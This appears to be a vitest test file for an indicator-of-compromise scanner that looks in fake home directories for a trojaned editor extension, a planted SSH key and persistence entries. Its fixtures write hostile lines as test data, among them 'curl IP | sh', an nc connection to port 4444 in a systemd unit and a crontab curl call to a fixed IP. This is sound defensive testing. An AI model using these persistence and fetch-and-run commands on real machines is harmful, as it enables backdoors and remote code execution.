/**
 * Feature kya-ioc-scan (kya doctor --iocs). Real-stack tests: runCli against planted fake homes,
 * a crontab stub at a fixed path (never PATH), the real detached child process, and the built hook when dist exists.
 * Feature id and command, named as written: kya-ioc-scan, kya doctor --iocs.
 */
import { count, reportZones } from "./support/report-zones.js";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { runCli, type CliIo } from "../src/cli.js";
import { loadIocList } from "../src/ioc/list.js";
import { authorizedKeyComments, runIocScan } from "../src/ioc/scan.js";
import { CHILD_PATH } from "../src/ioc/exec.js";
import { iocEnabled, IOC_SCAN_INTERVAL_MS, maybeSpawnIocScan } from "../src/ioc/spawn.js";
import { iocResultPath, readIocResult } from "../src/ioc/result.js";
import { loadReceiptModel } from "../src/receipt/render-receipt.js";
import { buildSharePayload } from "../src/receipt/share.js";

const IP = "134.209.82.225";

/** Where the scan's crontab locator points. Default: a stub that says "no crontab". */
const crontab = vi.hoisted(() => ({ override: undefined as string | undefined }));
vi.mock("../src/ioc/exec.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../src/ioc/exec.js")>();
  return { ...actual, locateCrontab: () => crontab.override };
});
const posix = process.platform !== "win32";
const repoRoot = fileURLToPath(new URL("..", import.meta.url));
const haveDist = existsSync(join(repoRoot, "dist/cli.js"));

const roots: string[] = [];
const savedKyaHome = process.env.KYA_HOME;

function tmp(prefix: string): string {
  const d = mkdtempSync(join(tmpdir(), prefix));
  roots.push(d);
  return d;
}

/** An executable stub that prints `content` for `crontab -l`, or fails with "no crontab". */
function stubCrontab(content: string | null): string {
  const dir = tmp("kya-ioc-cron-");
  const bin = join(dir, "crontab");
  writeFileSync(
    bin,
    content === null
      ? '#!/bin/sh\necho "no crontab for tester" >&2\nexit 1\n'
      : `#!/bin/sh\ncat <<'KYAEOF'\n${content}\nKYAEOF\n`,
  );
  chmodSync(bin, 0o755);
  return bin;
}

interface Fixture {
  readonly home: string;
  readonly cwd: string;
  readonly env: NodeJS.ProcessEnv;
}

function fixture(extra: NodeJS.ProcessEnv = {}): Fixture {
  const home = tmp("kya-ioc-home-");
  const cwd = tmp("kya-ioc-cwd-");
  return {
    home,
    cwd,
    env: { KYA_HOME: home, ...extra },
  };
}

function write(home: string, rel: string, text: string): void {
  const p = join(home, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, text);
}

function captureIo() {
  const logs: string[] = [];
  const errors: string[] = [];
  const io: CliIo = {
    log: (m) => logs.push(m),
    error: (m) => errors.push(m),
    exit: () => undefined,
  };
  return { io, logs, errors };
}

/** Runs `kya doctor --iocs --json` through the CLI and returns the stored result. */
interface StoredFinding { check: string; evidence: string; severity: string; hint: string }

async function scanViaCli(f: Fixture): Promise<{ findings: StoredFinding[]; skipped: number }> {
  const { io, logs } = captureIo();
  const code = await runCli(["doctor", "--iocs", "--json"], io, f.env, f.cwd);
  expect(code).toBe(0);
  const parsed = JSON.parse(logs.join("\n")) as { iocs: { result: { findings: StoredFinding[]; skipped: number } } };
  return parsed.iocs.result;
}

beforeEach(() => {
  process.env.KYA_HOME = tmp("kya-ioc-global-");
  crontab.override = stubCrontab(null); // default: no crontab, never the developer's real one
});

afterEach(() => {
  if (savedKyaHome === undefined) delete process.env.KYA_HOME;
  else process.env.KYA_HOME = savedKyaHome;
  for (const d of roots.splice(0)) rmSync(d, { recursive: true, force: true });
  vi.useRealTimers();
});

describe.skipIf(!posix)("kya-ioc-scan: planted indicators through kya doctor --iocs", () => {
  const cases: [string, (f: Fixture) => void, string, string][] = [
    ["extension", (f) => mkdirSync(join(f.home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true }), "extension", "~/.cursor/extensions/anthropic.claude-code-2.1.313"],
    ["authorized_keys comment", (f) => write(f.home, ".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyBlobHere svc-telemetry\n"), "ssh_authorized_keys_comment", "~/.ssh/authorized_keys line 1"],
    ["user crontab", () => { crontab.override = stubCrontab(`*/5 * * * * curl http://${IP}/x`); }, "net_indicator", "crontab -l"],
    ["LaunchAgent plist", (f) => write(f.home, "Library/LaunchAgents/com.bad.plist", `<plist><string>http://${IP}/x</string></plist>\n`), "net_indicator", "~/Library/LaunchAgents/com.bad.plist"],
    ["systemd user unit", (f) => write(f.home, ".config/systemd/user/bad.service", `[Service]\nExecStart=/bin/sh -c 'nc ${IP} 4444'\n`), "net_indicator", "~/.config/systemd/user/bad.service"],
    ["ssh config", (f) => write(f.home, ".ssh/config", `Host x\n  ProxyCommand nc ${IP} 22\n`), "net_indicator", "~/.ssh/config"],
    ["shell rc", (f) => write(f.home, ".zshrc", `curl ${IP} | sh\n`), "net_indicator", "~/.zshrc"],
  ];

  for (const [label, plant, check, evidence] of cases) {
    it(`finds the ${label} indicator`, async () => {
      const f = fixture();
      plant(f);
      const result = await scanViaCli(f);
      expect(result.findings).toHaveLength(1);
      expect(result.findings[0]).toMatchObject({ check, evidence, severity: "critical" });
      expect(result.findings[0].hint.length).toBeGreaterThan(20);
    });
  }

  it("a clean home yields no findings and no skipped files", async () => {
    const f = fixture();
    const result = await scanViaCli(f);
    expect(result.findings).toEqual([]);
    expect(result.skipped).toBe(0);
  });

  it("a suffixed platform directory matches, a near-miss version does not", async () => {
    const f = fixture();
    mkdirSync(join(f.home, ".vscode/extensions/anthropic.claude-code-2.1.3130"), { recursive: true });
    mkdirSync(join(f.home, ".vscode-oss/extensions/anthropic.claude-code-2.1.313-darwin-arm64"), { recursive: true });
    const result = await scanViaCli(f);
    expect(result.findings.map((x) => x.evidence)).toEqual(["~/.vscode-oss/extensions/anthropic.claude-code-2.1.313-darwin-arm64"]);
  });

  it("an unreadable file is skipped and counted, and the other checks still run", async () => {
    const f = fixture();
    mkdirSync(join(f.home, ".zshrc"), { recursive: true }); // a directory where a file is expected: EISDIR
    mkdirSync(join(f.home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true });
    const result = await scanViaCli(f);
    expect(result.skipped).toBe(1);
    expect(result.findings.map((x) => x.check)).toEqual(["extension"]);
  });

  it("matches the exact comment label only, and ignores quoted options with spaces", () => {
    const text = [
      'command="echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ svc-telemetry" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample svc-telemetry-old',
      "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOther svc-telemetry",
      "# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIComment svc-telemetry",
    ].join("\n");
    expect(authorizedKeyComments(text)).toEqual([
      { line: 1, comment: "svc-telemetry-old" },
      { line: 2, comment: "svc-telemetry" },
    ]);
  });

  it("the authorized_keys check matches the exact label: svc-telemetry-old is not a hit", async () => {
    const f = fixture();
    write(f.home, ".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyBlobHere svc-telemetry-old\n");
    const result = await scanViaCli(f);
    expect(result.findings).toEqual([]);
  });

  it("file_exists checks a path under home and refuses paths that leave it", async () => {
    const root = tmp("kya-ioc-file-");
    const home = join(root, "home");
    mkdirSync(home);
    const list = {
      schema: 1 as const,
      version: "test",
      iocs: [
        {
          id: "ioc-test-file",
          title: "test file indicator",
          severity: "high" as const,
          source: "test",
          checks: [
            { kind: "file_exists" as const, value: "~/.config/bad-ioc" },
            { kind: "file_exists" as const, value: "../outside" },
          ],
        },
      ],
    };
    write(home, ".config/bad-ioc", "x\n");
    writeFileSync(join(root, "outside"), "x\n"); // a file that "../outside" would reach
    const result = await runIocScan({ env: {}, home, list, now: new Date("2026-10-30T00:00:00Z") });
    expect(result.findings.map((x) => [x.check, x.evidence, x.severity])).toEqual([["file_exists", "~/.config/bad-ioc", "high"]]);
    expect(result.checkedAt).toBe("2026-10-30T00:00:00.000Z");
  });

  it("findings never carry the user name, file contents or the absolute home path", async () => {
    const f = fixture();
    write(f.home, ".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyBlobHere svc-telemetry\n");
    const result = await runIocScan({ env: f.env, home: f.home });
    const dump = JSON.stringify(result);
    expect(dump).not.toContain(f.home);
    expect(dump).not.toContain("AAAAC3NzaC1lZDI1NTE5");
    expect(dump).toContain("~/.ssh/authorized_keys line 1");
  });

  it("never runs a crontab found through PATH: a planted binary in a project dir does not execute", async () => {
    const project = tmp("kya-ioc-denied-");
    const marker = join(project, "ran.marker");
    writeFileSync(join(project, "crontab"), `#!/bin/sh\necho ran > "${marker}"\nexit 0\n`);
    chmodSync(join(project, "crontab"), 0o755);
    const home = tmp("kya-ioc-denied-home-");
    const stub = stubCrontab(null); // the fixed-path locator answer: a stub that says "no crontab"
    const savedPath = process.env.PATH;
    process.env.PATH = `${project}:.`;
    try {
      const result = await runIocScan({ env: { KYA_HOME: home, PATH: `${project}:.` }, home, locateCrontab: () => stub });
      expect(result.skipped).toBe(0);
    } finally {
      process.env.PATH = savedPath;
    }
    expect(existsSync(marker)).toBe(false);
  });

  it("with no safe crontab binary the check is skipped and counted, and nothing runs", async () => {
    const home = tmp("kya-ioc-nosafe-");
    const result = await runIocScan({ env: { KYA_HOME: home }, home, locateCrontab: () => undefined });
    expect(result.skipped).toBe(1);
    expect(result.findings).toEqual([]);
  });

  it.skipIf(!posix)("locateCrontab takes the first fixed candidate that is a regular file and not group or other writable", async () => {
    const { locateCrontab } = await vi.importActual<typeof import("../src/ioc/exec.js")>("../src/ioc/exec.js");
    const d = tmp("kya-ioc-locate-");
    const loose = join(d, "loose");
    writeFileSync(loose, "x");
    chmodSync(loose, 0o775);
    const safe = join(d, "safe");
    writeFileSync(safe, "x");
    chmodSync(safe, 0o755);
    expect(locateCrontab([join(d, "missing"), loose])).toBeUndefined();
    expect(locateCrontab([join(d, "missing"), loose, safe])).toBe(safe);
    expect(locateCrontab([d])).toBeUndefined();
  });

  it("the shipped list is the 2026-10 trojan entry with three checks", () => {
    const list = loadIocList();
    expect(list.schema).toBe(1);
    expect(list.iocs.map((i) => i.id)).toEqual(["ioc-2026-claude-vscode-trojan"]);
    expect(list.iocs[0].checks.map((c) => c.kind)).toEqual(["extension", "ssh_authorized_keys_comment", "net_indicator"]);
  });
});

describe.skipIf(!posix)("kya-ioc-scan: stored result, display and opt-out", () => {
  it("doctor --iocs stores ~/.kya/ioc-latest.json and plain doctor shows it", async () => {
    const f = fixture();
    mkdirSync(join(f.home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true });
    const { io, logs } = captureIo();
    expect(await runCli(["doctor", "--iocs"], io, f.env, f.cwd)).toBe(0);
    expect(logs.join("\n")).toMatch(/IoC check: 1 finding/);
    const stored = JSON.parse(readFileSync(iocResultPath(f.env), "utf8")) as { schema: number; findings: unknown[] };
    expect(stored.schema).toBe(1);
    expect(stored.findings).toHaveLength(1);

    const again = captureIo();
    expect(await runCli(["doctor"], again.io, f.env, f.cwd)).toBe(0);
    expect(again.logs.join("\n")).toContain("~/.cursor/extensions/anthropic.claude-code-2.1.313");
  });

  it("a damaged result file reads as no result, never an error", () => {
    const env = { KYA_HOME: tmp("kya-ioc-bad-") };
    mkdirSync(join(env.KYA_HOME, ".kya"), { recursive: true });
    writeFileSync(iocResultPath(env), "{not json");
    expect(readIocResult(env)).toBeUndefined();
  });

  it("KYA_IOC=0 and ioc.enabled=false both opt out of the background scan", () => {
    const home = tmp("kya-ioc-optout-");
    expect(iocEnabled({ KYA_HOME: home })).toBe(true);
    expect(iocEnabled({ KYA_HOME: home, KYA_IOC: "0" })).toBe(false);
    mkdirSync(join(home, ".kya"), { recursive: true });
    writeFileSync(join(home, ".kya", "config.json"), JSON.stringify({ ioc: { enabled: false } }));
    expect(iocEnabled({ KYA_HOME: home })).toBe(false);
  });

  it("the internal ioc-scan command honors the opt-out again", async () => {
    const f = fixture({ KYA_IOC: "0" });
    const { io } = captureIo();
    expect(await runCli(["ioc-scan"], io, f.env, f.cwd)).toBe(0);
    expect(existsSync(iocResultPath(f.env))).toBe(false);
  });

  it("the receipt shows a banner with findings and a card when clean", async () => {
    const dirty = fixture();
    mkdirSync(join(dirty.home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true });
    process.env.KYA_HOME = dirty.home; // the receipt reads the global result through process.env
    await runCli(["doctor", "--iocs"], captureIo().io, dirty.env, dirty.cwd);
    await runCli(["receipt"], captureIo().io, dirty.env, dirty.cwd);
    const html = readFileSync(join(dirty.cwd, ".kya", "receipts", "last-3d.html"), "utf8");
    expect(html).toContain('aria-label="IoC findings"');
    expect(html).toContain("~/.cursor/extensions/anthropic.claude-code-2.1.313");
    // The short banner repeats on every page; the detail is once, in the System zone.
    const dirtyZones = reportZones(html);
    expect(dirtyZones.top).toContain('aria-label="IoC findings"');
    expect(dirtyZones.top).not.toContain("anthropic.claude-code-2.1.313");
    expect(dirtyZones.zones["system"]).toContain("~/.cursor/extensions/anthropic.claude-code-2.1.313");

    const clean = fixture();
    process.env.KYA_HOME = clean.home;
    await runCli(["doctor", "--iocs"], captureIo().io, clean.env, clean.cwd);
    await runCli(["receipt"], captureIo().io, clean.env, clean.cwd);
    const cleanHtml = readFileSync(join(clean.cwd, ".kya", "receipts", "last-3d.html"), "utf8");
    expect(cleanHtml).toContain('aria-label="IoC check"');
    expect(cleanHtml).not.toContain('aria-label="IoC findings"');
    const cleanZones = reportZones(cleanHtml);
    expect(cleanZones.top).not.toContain("IoC check");
    expect(cleanZones.zones["system"]).toContain('aria-label="IoC check"');
    expect(count(cleanHtml, 'aria-label="Developer setup"')).toBe(1);
    expect(cleanZones.zones["system"]).toContain('aria-label="Developer setup"');
  });

  it("the dash ioc pane shows the findings", async () => {
    const f = fixture();
    mkdirSync(join(f.home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true });
    await runCli(["doctor", "--iocs"], captureIo().io, f.env, f.cwd);
    const { io, logs } = captureIo();
    expect(await runCli(["dash", "--once", "--offline", "--pane", "ioc"], io, f.env, f.cwd)).toBe(0);
    const out = logs.join("\n");
    expect(out).toContain("IoC check (advisory)");
    expect(out).toContain("[critical] ioc-2026-claude-vscode-trojan (extension)");
  });

  it("the share payload carries no IoC data", async () => {
    const f = fixture();
    mkdirSync(join(f.home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true });
    process.env.KYA_HOME = f.home;
    await runCli(["doctor", "--iocs"], captureIo().io, f.env, f.cwd);
    const model = loadReceiptModel({ cwd: f.cwd, days: 3, env: f.env });
    expect(model.ioc?.findings).toHaveLength(1);
    const payload = buildSharePayload(model) as unknown as Record<string, unknown>;
    expect("ioc" in payload).toBe(false);
    const dump = JSON.stringify(payload);
    expect(dump).not.toContain("ioc-2026");
    expect(dump).not.toContain(f.home);
  });
});

describe("kya-ioc-scan: daily background throttle", () => {
  it("starts at most one scan per 24 h (spawn seam)", () => {
    const env = { KYA_HOME: tmp("kya-ioc-throttle-") };
    const spawned: unknown[] = [];
    const spawnImpl = (...args: unknown[]) => {
      spawned.push(args);
      return { unref: () => undefined, on: () => undefined };
    };
    const t0 = Date.UTC(2026, 9, 30, 12);
    const deps = { env, entry: "/x/cli.js", spawnImpl: spawnImpl as never };
    expect(maybeSpawnIocScan({ ...deps, nowMs: t0 })).toBe(true);
    expect(maybeSpawnIocScan({ ...deps, nowMs: t0 + 60_000 })).toBe(false);
    expect(maybeSpawnIocScan({ ...deps, nowMs: t0 + IOC_SCAN_INTERVAL_MS - 1 })).toBe(false);
    expect(maybeSpawnIocScan({ ...deps, nowMs: t0 + IOC_SCAN_INTERVAL_MS + 1 })).toBe(true);
    expect(spawned).toHaveLength(2);
    expect(spawned[0]).toEqual([process.execPath, ["/x/cli.js", "ioc-scan"], expect.objectContaining({ detached: true, stdio: "ignore", cwd: homedir(), env: expect.objectContaining({ PATH: CHILD_PATH }) })]);
  });

  it("two runs in 24 h start exactly one real detached scan, and the caller never waits", async () => {
    const env = { KYA_HOME: tmp("kya-ioc-real-") };
    const entry = join(env.KYA_HOME, "fake-cli.mjs");
    writeFileSync(
      entry,
      `import { appendFileSync } from "node:fs";\nappendFileSync(${JSON.stringify(join(env.KYA_HOME, "starts.log"))}, process.argv[2] + "\\n");\nsetTimeout(() => {}, 300);\n`,
    );
    const t0 = Date.now();
    expect(maybeSpawnIocScan({ env, entry })).toBe(true);
    expect(maybeSpawnIocScan({ env, entry })).toBe(false);
    expect(Date.now() - t0).toBeLessThan(1500);
    const log = join(env.KYA_HOME, "starts.log");
    for (let i = 0; i < 50 && !existsSync(log); i++) await new Promise((r) => setTimeout(r, 100));
    await new Promise((r) => setTimeout(r, 500));
    expect(readFileSync(log, "utf8").trim().split("\n")).toEqual(["ioc-scan"]);
  });

  it("a relative entry starts nothing: the child runs from the home directory", () => {
    const env = { KYA_HOME: tmp("kya-ioc-rel-") };
    const spawnImpl = vi.fn(() => ({ unref: () => undefined, on: () => undefined }));
    expect(maybeSpawnIocScan({ env, entry: "cli.js", spawnImpl: spawnImpl as never })).toBe(false);
    expect(spawnImpl).not.toHaveBeenCalled();
  });

  it("KYA_IOC=0 starts nothing", () => {
    const env = { KYA_HOME: tmp("kya-ioc-off-"), KYA_IOC: "0" };
    const spawnImpl = vi.fn(() => ({ unref: () => undefined, on: () => undefined }));
    expect(maybeSpawnIocScan({ env, entry: "/x/cli.js", spawnImpl: spawnImpl as never })).toBe(false);
    expect(spawnImpl).not.toHaveBeenCalled();
  });
});

describe.skipIf(!posix || !haveDist)("kya-ioc-scan: the built hook", () => {
  const cli = join(repoRoot, "dist/cli.js");
  const bashPayload = (cwd: string) =>
    JSON.stringify({ hook_event_name: "PreToolUse", session_id: `ioc-${Math.random()}`, cwd, tool_name: "Bash", tool_input: { command: "ls" } });
  const neverPayload = JSON.stringify({ hook_event_name: "PreToolUse", session_id: "ioc-never", cwd: "/p", tool_name: "org.sample.never.event", tool_input: {} });

  function runHook(env: NodeJS.ProcessEnv, cwd: string, stdin: string) {
    const t0 = Date.now();
    const r = spawnSync(process.execPath, [cli, "hook", "--host", "claude"], { input: stdin, env, cwd, encoding: "utf8", timeout: 15_000 });
    return { ms: Date.now() - t0, status: r.status, stdout: r.stdout };
  }

  it("the hook answer is unchanged and the detached scan writes the result", async () => {
    const home = tmp("kya-ioc-hook-");
    const cwd = tmp("kya-ioc-hook-cwd-");
    mkdirSync(join(home, ".cursor/extensions/anthropic.claude-code-2.1.313"), { recursive: true });
    const env = { ...process.env, KYA_HOME: home, KYA_TELEMETRY: "0" };
    const allowed = runHook(env, cwd, bashPayload(cwd));
    expect(allowed.status).toBe(0);
    expect(allowed.ms).toBeLessThan(5000);
    const denied = runHook(env, cwd, neverPayload);
    expect(denied.status).toBe(2);
    expect(JSON.parse(denied.stdout).hookSpecificOutput.permissionDecision).toBe("deny");
    for (let i = 0; i < 100 && !existsSync(iocResultPath(env as NodeJS.ProcessEnv)); i++) await new Promise((r) => setTimeout(r, 100));
    const stored = readIocResult(env as NodeJS.ProcessEnv);
    expect(stored?.findings).toHaveLength(1);
  });

  it("KYA_IOC=0 keeps the hook from starting any scan", async () => {
    const home = tmp("kya-ioc-hook-off-");
    const cwd = tmp("kya-ioc-hook-off-cwd-");
    const env = { ...process.env, KYA_HOME: home, KYA_TELEMETRY: "0", KYA_IOC: "0" };
    expect(runHook(env, cwd, bashPayload(cwd)).status).toBe(0);
    await new Promise((r) => setTimeout(r, 1500));
    expect(existsSync(iocResultPath(env as NodeJS.ProcessEnv))).toBe(false);
  });
});
